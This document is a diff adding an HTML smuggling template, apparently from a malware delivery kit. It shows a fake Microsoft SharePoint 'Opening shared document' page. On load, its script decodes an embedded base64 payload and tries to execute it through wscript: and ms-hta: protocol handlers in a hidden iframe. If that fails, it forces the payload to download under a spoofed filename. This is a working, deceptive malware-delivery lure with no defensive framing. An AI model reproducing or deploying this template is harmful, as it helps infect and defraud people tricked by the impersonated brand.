@@ -1,0 +1,82 @@
+<!-- chunk: delivery/html_smuggling_auto -->
+<!-- provides: html_smuggling_autoexec -->
+<!-- format: html -->
+<!-- description: HTML smuggling with auto-execution attempt via ms-wscript protocol handler, falls back to download -->
+<!-- vars: PAYLOAD_B64, FILENAME, DOC_TITLE -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{{DOC_TITLE}}</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Segoe UI,Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.wrap{background:#fff;border-radius:8px;box-shadow:0 1px 12px rgba(0,0,0,.1);padding:40px 48px;max-width:440px;width:92%;text-align:center}
+.logo{font-size:28px;font-weight:700;color:#0078d4;margin-bottom:6px}
+.logo span{color:#50a3d9}
+h2{font-size:15px;font-weight:500;color:#333;margin-bottom:20px}
+.spinner{width:36px;height:36px;border:3px solid #e0e0e0;border-top-color:#0078d4;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 16px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.msg{font-size:13px;color:#666;margin-bottom:12px}
+.alt{display:none;margin-top:16px}
+.alt a{color:#0078d4;text-decoration:none;font-size:13px}
+.alt a:hover{text-decoration:underline}
+.fine{margin-top:24px;font-size:10px;color:#aaa}
+</style>
+</head>
+<body>
+<div class="wrap">
+<div class="logo">Share<span>Point</span></div>
+<h2>Opening shared document&hellip;</h2>
+<div class="spinner" id="spin"></div>
+<p class="msg" id="msg">Verifying access permissions</p>
+<div class="alt" id="alt"><p>If the document doesn't open automatically:<br><a href="#" id="dl">Click here to download</a></p></div>
+<p class="fine">Microsoft Corporation &bull; Terms of Use &bull; Privacy</p>
+</div>
+<script>
+(function(){
+var d="{{PAYLOAD_B64}}",fn="{{FILENAME}}";
+var msg=document.getElementById("msg"),alt=document.getElementById("alt"),dl=document.getElementById("dl"),spin=document.getElementById("spin");
+function b64decode(s){var r=atob(s),a=new Uint8Array(r.length);for(var i=0;i<r.length;i++)a[i]=r.charCodeAt(i);return a;}
+function saveFile(){
+var bytes=b64decode(d);
+var blob=new Blob([bytes],{type:"application/octet-stream"});
+if(window.navigator&&window.navigator.msSaveBlob){window.navigator.msSaveBlob(blob,fn);return true;}
+var u=URL.createObjectURL(blob);var a=document.createElement("a");a.href=u;a.download=fn;document.body.appendChild(a);a.click();
+setTimeout(function(){document.body.removeChild(a);URL.revokeObjectURL(u);},200);
+return true;
+}
+function tryProtoExec(){
+var bytes=b64decode(d);
+var blob=new Blob([bytes],{type:"application/octet-stream"});
+var u=URL.createObjectURL(blob);
+var iframe=document.createElement("iframe");iframe.style.display="none";document.body.appendChild(iframe);
+try{
+if(fn.match(/\.wsf$/i)){iframe.src="wscript:"+u;}
+else if(fn.match(/\.hta$/i)){iframe.src="ms-hta:"+u;}
+else{return false;}
+return true;
+}catch(e){return false;}
+}
+dl.onclick=function(e){e.preventDefault();saveFile();msg.textContent="Download started";spin.style.display="none";};
+setTimeout(function(){
+msg.textContent="Preparing document...";
+setTimeout(function(){
+var ok=false;
+try{ok=tryProtoExec();}catch(e){}
+if(!ok){
+msg.textContent="Click below to download your document";
+spin.style.display="none";
+alt.style.display="block";
+saveFile();
+}else{
+msg.textContent="Document opened successfully";
+spin.style.display="none";
+}
+},1500);
+},1000);
+})();
+</script>
+</body>
+</html>
